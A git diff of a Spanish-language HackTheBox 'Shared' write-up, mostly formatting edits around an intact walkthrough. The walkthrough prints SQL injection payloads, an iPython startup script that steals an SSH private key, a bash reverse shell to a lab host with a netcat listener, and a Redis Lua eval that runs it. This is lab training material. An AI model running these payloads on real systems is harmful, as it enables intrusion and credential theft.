@@ -11,15 +11,11 @@ description : ⚔️En esta máquina Linux de nivel medio tocaremos sqli para ob
 
 ⚔️En esta máquina Linux de nivel medio tocaremos sqli para obtener credenciales y conectarnos por ssh y posteriormente escalaremos con ipython al usuario dan y a través de redis al usuario root⚔️.
 
-🎥Canal Writeups Youtube🎬 --> [https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ](https://www.youtube.com/channel/UCllewdxU0OQudNp9-1IVJYQ)
-
 ![](/assets/images/HTB/Shared-HackTheBox/shared2.webp)
 
 ![](/assets/images/HTB/Shared-HackTheBox/shared-rating.webp)
 
 ***
-
-
 **Un pequeño INDICE**
 
 1. [Reconocimiento](#reconocimiento).
@@ -31,14 +27,8 @@ description : ⚔️En esta máquina Linux de nivel medio tocaremos sqli para ob
 4. [Escalada de Privilegios](#privesc). 
     * [iPython](#iPython).
     * [Redis cli](#redis).
-    
-    
 ***
-
-
 # Reconocimiento [#](reconocimiento) {#reconocimiento}
-
-***
 
 ## Reconocimiento de Puertos [🔍](#recon-nmap) {#recon-nmap}
 
@@ -59,16 +49,13 @@ Una vez que ya se que es una máquina Linux puedo proceder al reconocimiento de 
 
 ```bash
 # Primer escaneo para sacar los puertos abiertos de la máquina
---------------------------------------------------------------
 nmap -p- -Pn -n --min-rate 5000 10.10.11.186 --open -vvv
 ```
 
 ![](/assets/images/HTB/Shared-HackTheBox/nmap1.webp)
 
-
 ```bash
 # Segundo escaneo para sacar la versión de lo que se ejecuta en cada puerto y lanzamiento de una serie de scripts básicos de nmap contra dichos puertos.
---------------------------------------------------------------
 nmap -p80,22,21 -sCV -n 10.10.11.186
 ```
 
@@ -84,10 +71,7 @@ Por el momento tengo la siguiente información:
 
 > Dominio <span style="color:red">shared.htb</span> que añado al archivo /etc/hosts de mi máquina atacante.
 
-
 # Enumeración [#](enumeración) {#enumeración}
-
-***
 
 ## Enumeración Web [🔢](#enum-web) {#enum-web}
 
@@ -113,13 +97,10 @@ Pruebo a meter una serie de inyecciones sql con éxito.
 
 # Explotación [#](explotación) {#explotación}
 
-***
-
 ## Inyección SQL [💉](sqli) {#sqli}
 
 ```bash
 # Primero he de descubrir el nombre de la base de datos
-=======================================================
 {"' and 0=1 union select 1,database(),3-- -":"1"}
 ```
 
@@ -127,7 +108,6 @@ Pruebo a meter una serie de inyecciones sql con éxito.
 
 ```bash
 # A continuación intentaré listar las tablas existentes dentro de la base de datos checkout
-===========================================================================================
 {"' and 0=1 union select 1,table_name,table_schema from information_schema.tables where table_schema='checkout'-- -":"1"}
 ```
 
@@ -163,11 +143,9 @@ En esta ocasión usaré una herramienta online muy famosa.
 
 Y consigo la contraseña en texto plano.
 
-Ahora pruebo a loguearme con el usuario james y la contraseña en el servicio ssh y consigo acceso.
+Ahora pruebo a logarme con el usuario james y la contraseña en el servicio ssh y consigo acceso.
 
 # Escalada de Privilegios [#](privesc) {#privesc}
-
-***
 
 ## iPython [👨‍💻](#iPython) {#iPython}
 
@@ -177,7 +155,6 @@ Lo primero que se me ocurre es lanzar el binario linpeas.sh para buscar posibles
 
 ```bash
 # Veo que el usuario james_mason pertenece al grupo developer
-=============================================================
 uid=1000(james_mason) gid=1000(james_mason) groups=1000 (james_mason),1001(developer)
 ```
 
@@ -197,10 +174,11 @@ Asique me pongo a buscar vulnerabilidades de ipython o algún tipo de escalada d
 
 ```bash
 # Sigo los pasos para intentar leer la clave rsa del usuario dan_smith.
-=======================================================================
+
 mkdir -m 777 /opt/scripts_review/profile_default/
 mkdir -m 777 /opt/scripts_review/profile_default/startup
 echo "import os;os.system('cat ~/.ssh/id_rsa > ~/dan_smith.key')" > /opt/scripts_review/profile_default/startup/elc4br4.py
+
 # Debemos ejecutar rápidamente estos 3 comandos, sino no funcionará.
 ```
 
@@ -242,6 +220,7 @@ He de loguearme con redis-cli usando la contraseña que encontré, crear una rev
 # Reverse Shell Bash
 echo "bash -i >& /dev/tcp/10.10.14.10/443 0>&1" > /tmp/shell
 ```
+
 ```bash
 # Pongo netcat en escucha en el puerto 443
 nc -lnvp 443
@@ -249,9 +228,9 @@ nc -lnvp 443
 
 ```bash
 # Ejecuto Redis con la contraseña encontrada e introduzco el siguiente comando:
-==============================================================================
+
 redis-cli --pass F2WHqJUz2WEz=Gqq
-==============================================================================
+
 eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /tmp/shell | bash"); local res = f:read("*a"); f:close(); return res' 
 ```
 
